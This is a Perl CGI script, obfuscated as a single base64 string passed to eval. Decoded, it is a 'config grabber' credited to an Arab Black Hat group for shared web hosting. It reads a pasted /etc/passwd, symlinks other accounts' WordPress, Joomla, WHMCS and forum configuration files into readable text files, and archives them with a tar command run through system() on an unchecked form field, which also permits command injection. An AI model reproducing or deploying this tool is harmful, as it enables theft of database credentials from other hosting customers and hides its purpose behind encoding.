#!/usr/bin/perl -I/usr/local/bandmin
use
MIME::Base64;
eval(decode_base64('IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluCnByaW50ICJDb250ZW50LXR5cGU6
IHRleHQvaHRtbFxuXG4iOwpwcmludCc8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFRE
IFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwx
L0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+CjxodG1sIHhtbG5zPSJodHRwOi8vd3d3Lncz
Lm9yZy8xOTk5L3hodG1sIj4KPGhlYWQ+CjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtTGFuZ3Vh
Z2UiIGNvbnRlbnQ9ImVuLXVzIiAvPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNv
bnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4KPHRpdGxlPlt+XSBBcmFiIEJsYWNr
IEhhdDwvdGl0bGU+CjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+Ci5uZXdTdHlsZTEgewogZm9udC1m
YW1pbHk6IFRhaG9tYTsKIGZvbnQtc2l6ZTogeC1zbWFsbDsKIGZvbnQtd2VpZ2h0OiBib2xkOwog
Y29sb3I6ICMwMEZGRkY7CiAgdGV4dC1hbGlnbjogY2VudGVyOwp9Cjwvc3R5bGU+CjwvaGVhZD4K
JzsKc3ViIGxpbHsKICAgICgkdXNlcikgPSBAXzsKJG1zciA9IHF4e3B3ZH07CiRrb2xhPSRtc3Iu
Ii8iLiR1c2VyOwoka29sYT1+cy9cbi8vZzsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1Ymxp
Y19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLicudHh0Jyk7CnN5bWxpbmsoJy9o
b21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nMS50
eHQnKTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRr
b2xhLicyLnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0v
aW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJzMudHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVz
ZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25mLnBocCcsJGtvbGEuJzUudHh0Jyk7CnN5bWxpbmso
Jy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywka29sYS4nNC50
eHQnKTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAn
LCRrb2xhLicxMy50eHQnKTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Js
b2cvd3AtY29uZmlnLnBocCcsJGtvbGEuJzE0LnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1c2Vy
LicvcHVibGljX2h0bWwvY29uZl9nbG9iYWwucGhwJywka29sYS4nNi50eHQnKTsKc3ltbGluaygn
L2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwJywka29sYS4nNy50eHQn
KTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Nvbm5lY3QucGhwJywka29s
YS4nOC50eHQnKTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYu
cGhwJywka29sYS4nOS50eHQnKTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1s
L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nMTAudHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVz
ZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlL2NvbmZpZy5waHAnLCRrb2xhLicxMi50eHQnKTsKc3lt
bGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBo
cCcsJGtvbGEuJzExLnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwv
d2htL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nMTUudHh0Jyk7CnN5bWxpbmsoJy9ob21lLycu
JHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nMTYudHh0
Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3Vy
YXRpb24ucGhwJywka29sYS4nMTcudHh0Jyk7Cn0KaWYgKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30g
ZXEgJ1BPU1QnKSB7CiAgcmVhZChTVERJTiwgJGJ1ZmZlciwgJEVOVnsnQ09OVEVOVF9MRU5HVEgn
fSk7Cn0gZWxzZSB7CiAgJGJ1ZmZlciA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Owp9CkBwYWlycyA9
IHNwbGl0KC8mLywgJGJ1ZmZlcik7CmZvcmVhY2ggJHBhaXIgKEBwYWlycykgewogICgkbmFtZSwg
JHZhbHVlKSA9IHNwbGl0KC89LywgJHBhaXIpOwogICRuYW1lID1+IHRyLysvIC87CiAgJG5hbWUg
PX4gcy8lKFthLWZBLUYwLTldW2EtZkEtRjAtOV0pL3BhY2soIkMiLCBoZXgoJDEpKS9lZzsKICAk
dmFsdWUgPX4gdHIvKy8gLzsKICAkdmFsdWUgPX4gcy8lKFthLWZBLUYwLTldW2EtZkEtRjAtOV0p
L3BhY2soIkMiLCBoZXgoJDEpKS9lZzsKICAkRk9STXskbmFtZX0gPSAkdmFsdWU7Cn0KaWYgKCRG
T1JNe3Bhc3N9IGVxICIiKXsKcHJpbnQgJwo8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIiBiZ2NvbG9y
PSIjMDAwMDAwIj4KPHA+QXJhYiBCbGFjayBIYXQgQ29uZmlnIEZ1Y2sgU2NyaXB0PC9wPgo8cD48
Zm9udCBjb2xvcj0iI0MwQzBDMCI+WzwvZm9udD4gQ29kZWQgQnkgS2FyYXIgYUxTaGFNaSA8Zm9u
dCBjb2xvcj0iI0MwQzBDMCI+fDwvZm9udD4gCkRldmVsb3BlZCBCeSBWaVJ1U19CYUdoRGFEPHNw
YW4gaWQ9InJlc3VsdF9ib3giIGNsYXNzPSJzaG9ydF90ZXh0IiBsYW5nPSJlbiI+PHNwYW4gc3R5
bGUgdGl0bGU+Cjxmb250IGNvbG9yPSIjQzBDMEMwIj58PC9mb250Pjwvc3Bhbj48L3NwYW4+IDxh
IGhyZWY9Imh0dHA6Ly93d3cuYXJhYi1ibGFja2hhdC5jYyI+CjxzcGFuIHN0eWxlPSJ0ZXh0LWRl
Y29yYXRpb246IG5vbmUiPjxmb250IGNvbG9yPSIjMDBGRjAwIj53d3cuQXJhYi1CbGFja2hhdC5j
YzwvZm9udD48L3NwYW4+PC9hPiAKPGZvbnQgY29sb3I9IiNDMEMwQzAiPl08L2ZvbnQ+PC9wPgo8
Zm9ybSBtZXRob2Q9InBvc3QiPgo8dGV4dGFyZWEgbmFtZT0icGFzcyIgc3R5bGU9ImJvcmRlcjox
cHggZG90dGVkICMwMEZGRkY7IHdpZHRoOiA1NDNweDsgaGVpZ2h0OiA0MjBweDsgYmFja2dyb3Vu
ZC1jb2xvcjojMEMwQzBDOyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZTo4cHQ7IGNvbG9y
OiMwMEZGRkYiICA+PC90ZXh0YXJlYT48YnIgLz4KJm5ic3A7PHA+CjxpbnB1dCBuYW1lPSJ0YXIi
IHR5cGU9InRleHQiIHN0eWxlPSJib3JkZXI6MXB4IGRvdHRlZCAjMDBGRkZGOyB3aWR0aDogMjEy
cHg7IGJhY2tncm91bmQtY29sb3I6IzBDMEMwQzsgZm9udC1mYW1pbHk6VGFob21hOyBmb250LXNp
emU6OHB0OyBjb2xvcjojMDBGRkZGOyAiICAvPjxiciAvPgombmJzcDs8L3A+CjxwPgo8aW5wdXQg
bmFtZT0iU3VibWl0MSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iR2V0IENvbmZpZyIgc3R5bGU9ImJv
cmRlcjoxcHggZG90dGVkICMwMEZGRkY7IHdpZHRoOiA5OTsgZm9udC1mYW1pbHk6VGFob21hOyBm
b250LXNpemU6MTBwdDsgY29sb3I6IzAwRkZGRjsgdGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlOyBo
ZWlnaHQ6MjM7IGJhY2tncm91bmQtY29sb3I6IzBDMEMwQyIgLz48L3A+CjwvZm9ybT4nOwp9ZWxz
ZXsKQGxpbmVzID08JEZPUk17cGFzc30+OwokeSA9IEBsaW5lczsKb3BlbiAoTVlGSUxFLCAiPnRh
ci50bXAiKTsKcHJpbnQgTVlGSUxFICJ0YXIgLWN6ZiAiLiRGT1JNe3Rhcn0uIi50YXIgIjsKZm9y
ICgka2E9MDska2E8JHk7JGthKyspewp3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9n
KXsKJmxpbCgkMSk7CnByaW50IE1ZRklMRSAkMS4iLnR4dCAiOwpmb3IoJGtkPTE7JGtkPDE4OyRr
ZCsrKXsKcHJpbnQgTVlGSUxFICQxLiRrZC4iLnR4dCAiOwp9Cn0KIH0KcHJpbnQnPGJvZHkgY2xh
c3M9Im5ld1N0eWxlMSIgYmdjb2xvcj0iIzAwMDAwMCI+CjxwPkRvbmUgISE8L3A+CjxwPiZuYnNw
OzwvcD4nOwppZigkRk9STXt0YXJ9IG5lICIiKXsKb3BlbihJTkZPLCAidGFyLnRtcCIpOwpAbGlu
ZXMgPTxJTkZPPiA7CmNsb3NlKElORk8pOwpzeXN0ZW0oQGxpbmVzKTsKcHJpbnQnPHA+PGEgaHJl
Zj0iJy4kRk9STXt0YXJ9LicudGFyIj48Zm9udCBjb2xvcj0iIzAwRkYwMCI+CjxzcGFuIHN0eWxl
PSJ0ZXh0LWRlY29yYXRpb246IG5vbmUiPkNsaWNrIEhlcmUgVG8gRG93bmxvYWQgVGFyIEZpbGU8
L3NwYW4+PC9mb250PjwvYT48L3A+JzsKfQp9CiBwcmludCIKPC9ib2R5Pgo8L2h0bWw+IjsK'));